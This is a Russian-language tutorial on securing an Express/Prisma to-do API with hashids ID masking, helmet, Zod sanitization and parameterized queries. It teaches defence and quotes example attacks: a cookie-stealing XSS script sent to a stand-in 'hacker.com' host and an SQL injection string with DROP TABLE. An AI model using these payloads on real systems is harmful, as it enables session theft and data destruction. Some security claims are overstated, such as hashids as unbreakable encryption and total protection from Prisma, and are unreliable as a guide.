Теперь, когда у нас есть живой сервер, подключенный к базе данных, мы должны защитить его от внешнего мира. На повестке дня две критически важные инженерные задачи: **защита от перебора URL (маскирование ID)** и **общая защита HTTP-заголовков**.
# 1. Проблема открытых автоинкрементных ID

Сейчас твоя база данных генерирует обычные числа для ID задач (`1`, `2`, `3`). Из-за этого ссылки на задачи выглядят так: `/api/todo/1`.  
В реальном продакшене это огромная уязвимость (называется **ID Enumeration** или несанкционированный перебор).
- **В чем опасность:** Злоумышленник видит ID `1`. Он понимает, что может просто написать цикл от 1 до 10000, запустить его и выкачать абсолютно все задачи всех пользователей из твоей базы данных (или удалить их). Кроме того, по ID `3` конкуренты сразу поймут, что на твоем сервисе создано всего 3 задачи — это выдает коммерческую тайну.

## Как решить: Маскирование через библиотеку `hashids`
Мы не будем хранить в базе данных сложные строки. В БД ID останутся быстрыми числами (`Int`). Но в момент, когда мы отдаем ID клиенту в JSON, мы будем шифровать его в красивую уникальную строку (например, число `1` превратится в `jR09dx`). А когда клиент присылает нам строку `/api/todo/jR09dx`, наш сервер будет расшифровывать её обратно в число `1` перед запросом к Prisma.

Для этого используется проверенная временем библиотека **`hashids`**. Она работает невероятно быстро, не требует базы данных и шифрует/дешифрует данные на лету с использованием секретной "соли" (Salt).

### Как это работает (Теория синтаксиса):

Сначала устанавливаем пакет: `npm install hashids`.
```javascript
const Hashids = require('hashids/cjs');
// Создаем экземпляр и передаем секретную соль (ее мы спрячем в .env)
const hashids = new Hashids('моя_секретная_соль_из_env', 6); // 6 — минимальная длина строки

// Шифрование (Число -> Строка)
const encrypted = hashids.encode(1); // Результат: "jR09dx"

// Расшифровка (Строка -> Число)
const decrypted = hashids.decode("jR09dx"); // Результат: [1] (Внимание: возвращает массив!)
const id = decrypted[0]; // Вытаскиваем наше число 1
```

# 2. Защита HTTP-заголовков (Пакет `helmet`)

Браузеры и хакерские утилиты по умолчанию могут вытащить из твоего сервера много лишней информации ( например, заголовок `X-Powered-By: Express` сразу говорит взломщику, на каком фреймворке написан бэк, и он начинает искать уязвимости именно под Express).

В мире Node.js есть золотой стандарт безопасности — мидлварь **`helmet`**. Она автоматически настраивает и скрывает десятки HTTP-заголовков, защищая сервер от XSS-атак, кликджекинга и других базовых уязвимостей.
- **Как применить:** `npm install helmet` и в самом верху `app.js` просто прописать: `app.use(helmet());`.

# Если хакер НЕ знает соль:
Даже зная алгоритм `hashids`, без соли расшифровать строку `jR09dx` **невозможно**. Алгоритм перемешивает алфавит генерации на основе этой соли. Перебирать алгоритмы вручную хакеру бесполезно, потому что количество комбинаций соли бесконечно.  
Без соли «угадать», что `jR09dx` — это число `1`, нельзя. Для него это просто случайный набор букв.

## Если хакер взломал сервер и украл `.env` файл с солью:
Если он получил доступ к `.env`, **твоя защита через `hashids` полностью помножена на ноль.** Он мгновенно напишет скрипт, который с этой солью расшифрует все ID и начнет перебор.

**Но тут старший инженер скажет тебе важную истину:**  
Если хакер смог проникнуть на твой сервер и прочитать файлы конфигурации (произошла уязвимость _RCE_ или утечка данных), то маскирование ID — это наименьшая из твоих проблем. В этот момент хакер **уже имеет полный доступ к твоему коду и базе данных**. Ему больше не нужно перебирать URL, он может просто написать `DROP DATABASE` прямо в консоли Postgres.

## Зачем тогда нужен `hashids`, если при краже соли он бесполезен?

Он защищает от **внешних (черных) атак**, когда сервер изнутри цел, но фронтенд или URL открыты миру.

1. **Защита от парсинга (Web Scraping)**: Конкуренты не смогут написать простейший скрипт в три строчки, который в цикле `for i от 1 до 1000` скачает всю твою базу через браузер.
2. **Бизнес-разведка**: Если ID открыты, конкурент регистрируется, создает задачу и видит ID `100`. Через неделю создает еще одну и видит ID `150`. Он понимает: твой бизнес растет на 50 задач в неделю. Это ценные коммерческие данные. С `hashids` они увидят строки `XyZ7a` и `bK9w2`, по которым невозможно понять объем твоей базы.

_Для максимальной безопасности в будущем (например, в NestJS) вместо чисел используют **UUID** (уникальные 36-символьные строки вида `123e4567-e89b-12d3-a456-426614174000`). Их невозможно перебрать физически, даже зная всё на свете, так как они генерируются абсолютно случайно._

# Стандартные виды атак

## 1. XSS-атака (Cross-Site Scripting — Межсайтовый скриптинг)
Это ситуация, когда хакеру удается **внедрить вредоносный JavaScript-код в твой сервер**, а сервер послушно отдает этот код другим пользователям.
- **Пример из жизни:** Хакер создает задачу в твоем To-Do приложении. Вместо названия `"Купить хлеб"` он пишет:

    ```html
    <script>fetch('http://hacker.com' + document.cookie)</script>
    ```

- Твой сервер без валидации сохраняет эту строку в PostgreSQL.
- На следующий день ты заходишь в приложение. Сервер достает эту задачу из базы и выводит на экран. Браузер видит тег `<script>`, думает, что это легальный код, и **выполняет его**. Скрипт мгновенно крадет твои пароли/куки и отправляет хакеру. Вывод: взломали тебя через чужую задачу.
- _Защита:_ Пакет `helmet` и валидация через Zod, которая не позволяет присылать HTML-теги там, где должен быть чистый текст.

## 2. Кликджекинг (Clickjacking — Угон клика)
Это обман пользователя на фронтенде, при котором хакер заставляет тебя нажать на кнопку, которую ты не видишь.
- **Пример из жизни:** Хакер создает сайт с бесплатными фильмами или выигрышем айфона. Поверх кнопки «Смотреть фильм» он накладывает **невидимый прозрачный слой (iframe)**, внутри которого открыт твой To-Do сервер и кнопка «Удалить все задачи».
- Ты заходишь на сайт хакера, хочешь включить фильм, кликаешь по экрану — но клик проходит сквозь прозрачную картинку и нажимает на скрытую кнопку твоего сервера. Задачи удалены, а ты даже не понял, как это произошло.
- _Защита:_ `helmet` добавляет специальный HTTP-заголовок `X-Frame-Options: DENY`. Он жестко запрещает открывать твой сайт внутри других сайтов через прозрачные фреймы (`iframe`).

## 3. Базовые уязвимости (Информация о сервере)
По умолчанию Express.js отправляет в каждом ответе заголовок `X-Powered-By: Express`.  
Для хакера это подарок. Он понимает: «Ага, сервер на Экспрессе. Какая там сейчас версия Node.js? Дай-ка я поищу в гугле готовые эксплоиты под эту версию».
- _Защита:_ `helmet` просто удаляет этот заголовок, усложняя хакеру разведку.

## Защита от SQL-инъекций (SQL Injection)

SQL-инъекция — это когда хакер передает в поле кусок SQL-кода (например, `title: "Купить хлеб'; DROP TABLE \"Task\"; --"`), чтобы сломать или украсть базу данных.
- **Твоя защита:** Благодаря тому, что мы используем **Prisma ORM**, мы **уже защищены на 100%**. Prisma не подставляет строки напрямую в SQL-запрос. Она использует так называемые _параметризованные запросы_ (Prepared Statements). Для базы данных всё тело `req.body` всегда будет просто безобидным текстом, и никакой скрытый код там не выполнится.

## Валидация типов данных (Zod)

В твоем коде роутера уже подключен `validator(toDoSchema)`. Он защищает от отправки пустых полей или неправильных типов (например, если хакер пришлет вместо названия задачи массив или число). Это отсекает 90% мусорных запросов.

## Защита от XSS (Очистка текста / Санитизация)

Даже если Prisma защитила базу данных, хакер может прислать в `description` вредоносный HTML-тег: `<script>alert('взломан')</script>`. Prisma запишет его как обычный текст. Но когда этот текст скачает фронтенд и вставит на страницу, у пользователя выполнится чужой скрипт.
- **Как защититься на бэкенде:** Самый элегантный способ в связке с Express и Zod — это использовать встроенный метод `.transform()` прямо в схеме валидации Zod, чтобы автоматически кодировать или удалять опасные символы `<`, `>`, `&`.

Давай прокачаем твою схему валидации в `validator.js`, чтобы она на лету очищала текст от HTML-тегов (это называется HTML Sanitization):
```javascript
const { z } = require('zod');

// Функция-помощник, которая превращает кусок HTML в безопасный текст
// Например, строку "<script>" она превратит в "&lt;script&gt;", и браузер её не выполнит
const sanitizeString = (val) => val.replace(/</g, '&lt;').replace(/>/g, '&gt;');

const toDoSchema = z.object({
  title: z.string({ required_error: 'Название задачи обязательно' })
        .min(2, 'Название задачи слишком короткое')
        .transform(sanitizeString), // 🌟 Магия Zod: автоматически очистит title

  description: z.string({ required_error: 'Описание задачи обязательно' })
        .min(2, 'Описание задачи слишком короткое')
        .transform(sanitizeString)  // 🌟 Автоматически очистит description
});
```
